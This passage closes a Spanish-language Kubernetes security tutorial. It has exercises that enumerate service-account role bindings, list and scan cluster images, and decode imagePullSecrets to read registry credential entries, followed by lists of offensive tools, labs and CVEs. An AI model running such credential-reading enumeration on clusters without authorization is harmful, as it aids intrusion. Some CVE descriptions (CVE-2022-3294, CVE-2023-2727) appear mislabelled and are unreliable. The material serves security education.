    ROLES=$(kubectl get rolebinding -n $NS -o json 2>/dev/null | jq -r ".items[] | select(.subjects[]?.name == \"$NAME\") | .roleRef.name")
    CRB=$(kubectl get clusterrolebinding -o json 2>/dev/null | jq -r ".items[] | select(.subjects[]?.name == \"$NAME\") | .roleRef.name")
    if [ -n "$ROLES" ] || [ -n "$CRB" ]; then
        echo "SA: $NS/$NAME → Roles: $ROLES, ClusterRoles: $CRB"
    fi
done
```

### Ejercicio 8: Supply Chain Audit

```bash
# 1. Listar imágenes usadas en el cluster
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' | sort -u

# 2. Escanear cada imagen con trivy (si está instalado)
for IMG in $(kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' | sort -u); do
    echo "=== $IMG ==="
    trivy image --severity CRITICAL --quiet $IMG
done

# 3. Verificar imagePullSecrets
for SEC in $(kubectl get secrets -o json | jq -r '.items[] | select(.type == "kubernetes.io/dockerconfigjson") | .metadata.name'); do
    echo "Secret: $SEC"
    kubectl get secret $SEC -o json | jq -r '.data.".dockerconfigjson"' | base64 -d | jq '.auths | keys'
done
```

---

## 13. Referencias y Recursos

### Documentación oficial
- [Kubernetes Security Documentation](https://kubernetes.io/docs/concepts/security/)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [NSA/CISA Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.1_20220829.PDF)

### Herramientas
- [kube-hunter](https://github.com/aquasecurity/kube-hunter)
- [kube-bench](https://github.com/aquasecurity/kube-bench)
- [Peirates](https://github.com/inguardians/peirates)
- [Kubesploit](https://github.com/cyberark/Kubesploit)
- [kubeaudit](https://github.com/Shopify/kubeaudit)
- [kubescape](https://github.com/kubescape/kubescape)
- [kubectl-who-can](https://github.com/aquasecurity/kubectl-who-can)
- [kubeletctl](https://github.com/cyberark/kubeletctl)
- [Rakkess](https://github.com/corneliusweig/rakkess)

### Papers y talks
- "Attacking [kubernetes](../raw/k8s-d33p-d1v3.md)-d33p-d1v3.md)" - Ian Coldwater
- "Kubernetes Security Beyond the Basics" - Brad Geesaman
- "Hacking and Hardening Kubernetes Clusters by Example" - Brad Geesaman
- "[container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) Breakout" - Trail of Bits

### Labs de práctica
- [Kubernetes Goat](https://github.com/madhuakula/kubernetes-goat)
- [Kubernetes Security Workshop](https://github.com/controlplaneio/kubernetes-security-workshop)
- [SecureKubeflow](https://github.com/securekubeflow/securekubeflow)
- [K8s Security Lab](https://github.com/leodido/k8s-security-lab)

### CVEs importantes
- [cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2019-5736 — runc breakout
- CVE-2020-8554 — [man-in-the-middle](../raw/m1tm-m0b1l3.md) using ExternalIPs
- CVE-2021-25741 — Symlink exchange in subpath
- CVE-2022-0185 — Linux [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) escape via containers
- CVE-2022-3294 — etcd no auth bypass
- CVE-2023-2727 — kubelet bypass in podCIDR
- CVE-2024-21626 — runc FD leak

---

> **Disclaimer**: Este material es estrictamente educativo. No uses estas técnicas en sistemas sin autorización explícita. El hacking ético requiere consentimiento por escrito. Armá tu lab con KinD, Minikube o K3s y practicá ahí.

